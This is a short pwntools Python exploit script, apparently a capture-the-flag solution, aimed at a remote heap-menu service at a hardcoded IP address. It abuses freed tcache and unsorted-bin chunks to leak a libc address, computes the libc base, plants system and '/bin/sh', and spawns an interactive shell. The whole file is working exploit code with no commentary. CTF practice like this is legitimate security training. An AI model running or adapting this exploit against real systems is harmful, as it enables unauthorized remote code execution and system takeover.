from pwn import *

r = remote('94.237.48.92',53887)
libc = ELF('./glibc/libc.so.6')


def add(size, page, content):
    for item in [b'1', size, page, content]:
        r.sendlineafter('💀'.encode('utf-8'), item)

def del_show(num, page):
    for item in [num, page]:
        r.sendlineafter('💀'.encode('utf-8'), item)


for i in range(9):
    add(b'128', str(i).encode(), b'kek')

add(b'10', b'9', b'kek')

for i in range(7):
    del_show(b'2', str(i).encode())

del_show(b'2', b'7')

del_show(b'3', b'7')

r.recvline()
leak = r.recvline().strip()[14:]
leak = u64(leak.ljust(8, b"\x00"))

base = leak - 0x21ACE0
log.info("Leaked server's libc address: " + hex(base))
libc.address = base

add(b'128', b'0', str(hex(libc.sym[b"system"]))[2:].encode())
add(b'128', b'1', b'/bin/sh\x00')

r.sendlineafter('💀'.encode('utf-8'), b'42')

r.interactive()
